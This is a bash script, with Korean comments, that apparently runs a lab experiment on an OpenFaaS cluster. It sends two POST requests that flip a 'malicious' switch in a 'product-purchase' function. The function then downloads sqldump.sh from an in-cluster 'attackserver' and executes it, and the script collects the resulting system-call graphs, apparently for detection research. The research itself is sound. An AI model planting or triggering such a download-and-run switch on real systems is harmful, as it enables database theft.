#!/bin/bash

##여기에 어택을 위한 함수 컨테이너들을 올리는 작업을 해야함
./attack-sqldump/build.sh

NAMESPACE="openfaas-fn"
dots=1
# openfaas-fn 네임스페이스의 Pod 상태 확인
while true; do
    # Pod 목록 가져오기
    # pods=$(kubectl get pods -n $NAMESPACE --no-headers 2>/dev/null)
    pods=$(faas-cli list --quiet)
    
    # Pod가 존재하는지 확인
    if [ ! -z "$pods" ]; then
    printf "\n"
        printf "openfaas-fn 네임스페이스에 Pod이 정상적으로 실행되었습니다. 다음 명령어로 넘어갑니다.\n"
        break
    else
        # Pod가 존재하는 동안 대기 중 메시지 출력
        case $dots in
            1) printf "\ropenfaas-fn 네임스페이스에 Pod가 존재하지 않습니다. 대기 중.  " ;;
            2) printf "\ropenfaas-fn 네임스페이스에 Pod가 존재하지 않습니다. 대기 중.. " ;;
            3) printf "\ropenfaas-fn 네임스페이스에 Pod가 존재하지 않습니다. 대기 중... " ;;
        esac

        # dots 값 순환
        dots=$(( (dots % 3) + 1 ))
        sleep 0.5  # 5초 대기 후 다시 확인
    fi
done

# grafaas 컨테이너 이름 자동으로 가져오기
GRAFAAS_CONTAINER=$(kubectl get pods -n openfaas --no-headers | grep 'grafaas' | awk '{print $1}')

# 함수 이름 리스트를 가져오기
function_list=$(kubectl exec -n openfaas "$GRAFAAS_CONTAINER" -- cat /tmp/function_list)

# pods 배열 만들기
pods=($(faas-cli list --quiet))

# 모든 pod 이름이 function_list에 존재하는지 확인
while true; do
    # function_list 파일 존재 여부 확인
    if kubectl exec -n openfaas "$GRAFAAS_CONTAINER" -- test -f /tmp/function_list; then
        function_list=$(kubectl exec -n openfaas "$GRAFAAS_CONTAINER" -- cat /tmp/function_list)
        
        all_exist=true
        for pod in "${pods[@]}"; do
            if ! echo "$function_list" | grep -q "$pod"; then
                all_exist=false
                break
            fi
        done

        # 모두 존재하면 루프 탈출
        if $all_exist; then
            break
        fi
    else
        echo "/tmp/function_list 파일이 아직 존재하지 않습니다. 잠시 후 다시 확인합니다."
    fi

    # 잠시 대기 후 다시 확인
    sleep 2
done

# curl 명령어로 POST 요청 수행 (10초 타임아웃 설정)
# malicious: one  ==>  attackserver로 부터 sqldump.sh 다운
response=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:80/function/product-purchase \
    -H "Content-Type: application/json" \
    -d '{
        "id": "test",
        "user": "testuser",
        "creditCard": "0000-0000-0000-0000",
        "malicious": "one",
        "attackserver": "attackserver.openfaas-fn.svc.cluster.local:8889"
    }')

# HTTP 상태 코드가 200 (성공)인 경우만 다음 단계로 진행
if [ "$response" -eq 200 ]; then
    echo "Request one successful. Proceeding to the next step."
    # 다음 명령어 실행
    # next_command_here
else
    echo "Request one failed or timed out (HTTP status: $response)."
    echo "함수 컨테이너의 응답지연으로 다시 시작합니다."
    # 타임아웃 또는 실패 시 다음 반복으로 건너뜀
    continue
fi

# curl 명령어로 POST 요청 수행 (10초 타임아웃 설정)
# malicioust: two  ==>  sqldump.sh 실행
response=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:80/function/product-purchase \
    -H "Content-Type: application/json" \
    -d '{
        "id": "test",
        "user": "testuser",
        "creditCard": "0000-0000-0000-0000",
        "malicious": "two",
        "attackserver": "attackserver.openfaas-fn.svc.cluster.local:8889"
    }')


# HTTP 상태 코드가 200 (성공)인 경우만 다음 단계로 진행
if [ "$response" -eq 200 ]; then
    echo "Request two successful. Proceeding to the next step."
else
    echo "Request two failed or timed out (HTTP status: $response)."
    echo "함수 컨테이너의 응답지연으로 다시 시작합니다."
    # 타임아웃 또는 실패 시 다음 반복으로 건너뜀
    continue
fi


FILE_PATH="/system_call_graph.png"
GRAPHS_DIR="./graphs_sqldump"
GRAPHS_DOT_DIR="./graphs_sqldump_dot"

# 디렉토리 생성
mkdir -p "$GRAPHS_DIR" "$GRAPHS_DOT_DIR"

# 파일이 존재할 때까지 대기 (최대 20초)
MAX_WAIT_TIME=20
START_TIME=$(date +%s)

while true; do
    CURRENT_TIME=$(date +%s)
    ELAPSED_TIME=$((CURRENT_TIME - START_TIME))

    if kubectl exec -n openfaas "$GRAFAAS_CONTAINER" -- test -f "$FILE_PATH"; then
        echo "파일이 존재합니다. 로컬로 복사 중..."

        # graphs 폴더에 저장할 파일명 생성
        GRAPH_COUNT=$(ls "$GRAPHS_DIR" | wc -l)
        GRAPH_FILE="$GRAPHS_DIR/system_call_graph_$((GRAPH_COUNT + 1)).png"
        
        # graphs_dot 폴더에 저장할 파일명 생성
        GRAPH_DOT_COUNT=$(ls "$GRAPHS_DOT_DIR" | wc -l)
        GRAPH_DOT_FILE="$GRAPHS_DOT_DIR/system_call_graph_$((GRAPH_DOT_COUNT + 1)).dot"

        # 파일 복사
        kubectl cp openfaas/$GRAFAAS_CONTAINER:$FILE_PATH $GRAPH_FILE
        echo "파일이 $GRAPH_FILE 에 복사되었습니다."

        # 같은 파일을 graphs_dot에도 복사
        kubectl cp openfaas/$GRAFAAS_CONTAINER:/system_call_graph $GRAPH_DOT_FILE
        echo "파일이 $GRAPH_DOT_FILE 에 복사되었습니다."

        break
    else
        if [ "$ELAPSED_TIME" -ge "$MAX_WAIT_TIME" ]; then
            echo "20초 이내에 파일을 찾지 못했습니다. 루프를 종료합니다."
            break
        fi

        echo "파일이 아직 존재하지 않습니다. 대기 중..."
        sleep 5  # 5초 대기 후 다시 확인
    fi
done